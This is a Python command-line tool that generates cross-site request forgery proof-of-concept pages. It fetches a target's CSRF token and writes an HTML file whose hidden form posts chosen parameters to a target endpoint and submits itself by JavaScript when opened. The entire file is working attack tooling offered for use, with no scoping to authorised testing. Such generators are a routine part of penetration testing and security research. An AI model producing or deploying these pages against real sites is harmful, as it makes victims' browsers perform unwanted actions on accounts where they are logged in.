import os
import argparse
import requests
from bs4 import BeautifulSoup

def fetch_csrf_token(url, token_field="csrf_token"):
    """
    Fetch the CSRF token from a target URL by searching the HTML for the token field name.

    :param url: Target URL to fetch the CSRF token from.
    :param token_field: Name or id of the CSRF token field in HTML.
    :return: Token value as a string if found, else None.
    """
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Look for token by input field name or ID
        token_element = soup.find("input", {"name": token_field}) or soup.find("input", {"id": token_field})
        if token_element:
            return token_element.get("value")
        else:
            print("[!] CSRF token field not found.")
    except Exception as e:
        print(f"[!] Error fetching CSRF token: {e}")
    return None

def generate_csrf_poc(url, method='POST', params=None, headers=None, auto_submit=True):
    """
    Generates a CSRF Proof-of-Concept HTML file with enhanced features.

    :param url: The target URL of the vulnerable endpoint.
    :param method: HTTP method (POST or GET).
    :param params: Dictionary of parameters to be sent with the request.
    :param headers: Dictionary of HTTP headers to simulate realistic request conditions.
    :param auto_submit: Boolean to control form auto-submission.
    :return: Generated HTML code as a string.
    """

    if params is None:
        params = {}

    # HTML template for CSRF attack with optional headers
    html_template = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Enhanced CSRF PoC</title>
    </head>
    <body>
        <form id="csrfForm" action="{url}" method="{method}">
    """

    # Adding hidden input fields for each parameter
    for key, value in params.items():
        html_template += f'            <input type="hidden" name="{key}" value="{value}">\n'

    # Optional headers are embedded as JavaScript (for testing in some CORS scenarios)
    if headers:
        html_template += "<!-- Custom headers: Might be ineffective due to CORS restrictions -->\n"
        for header, value in headers.items():
            html_template += f'        <!-- {header}: {value} -->\n'

    # Auto-submit JavaScript block (conditional)
    if auto_submit:
        html_template += """
            <input type="submit" value="Submit CSRF PoC">
        </form>
        <script>
            document.getElementById('csrfForm').submit();
        </script>
    """
    else:
        html_template += """</form>"""

    html_template += """
    </body>
    </html>
    """

    return html_template


def save_html_poc(file_name, html_code):
    """
    Saves the HTML code to a file.

    :param file_name: Name of the file to save HTML code to.
    :param html_code: HTML code as a string.
    """
    with open(file_name, 'w') as file:
        file.write(html_code)
    print(f"[+] Enhanced CSRF PoC saved as {file_name}")


def main():
    parser = argparse.ArgumentParser(description="CSRF PoC Generator with enhanced features.")
    parser.add_argument("url", help="Target URL of the vulnerable endpoint.")
    parser.add_argument("-m", "--method", default="POST", choices=["GET", "POST"],
                        help="HTTP method to use (default: POST)")
    parser.add_argument("-p", "--params", nargs='+', metavar="KEY=VALUE", help="Parameters for the request in key=value format")
    parser.add_argument("--user-agent", help="Custom User-Agent header")
    parser.add_argument("--referer", help="Custom Referer header")
    parser.add_argument("-t", "--token", help="Name of the CSRF token field if one exists")
    parser.add_argument("--no-auto-submit", action="store_true", help="Disable auto-submit of the form")
    parser.add_argument("-o", "--output", default="csrf_poc.html", help="Output file name for the HTML PoC")

    args = parser.parse_args()

    # Parse parameters
    parameters = {}
    if args.params:
        for param in args.params:
            key, value = param.split("=", 1)
            parameters[key] = value

    # Parse headers
    headers = {}
    if args.user_agent:
        headers["User-Agent"] = args.user_agent
    if args.referer:
        headers["Referer"] = args.referer

    # Fetch CSRF token if specified
    if args.token:
        csrf_token = fetch_csrf_token(args.url, args.token)
        if csrf_token:
            parameters[args.token] = csrf_token
        else:
            print("[!] Could not fetch CSRF token, proceeding without it.")

    # Generate CSRF PoC HTML
    csrf_html = generate_csrf_poc(args.url, args.method, parameters, headers, not args.no_auto_submit)

    # Save the HTML file
    save_html_poc(args.output, csrf_html)


if __name__ == "__main__":
    main()
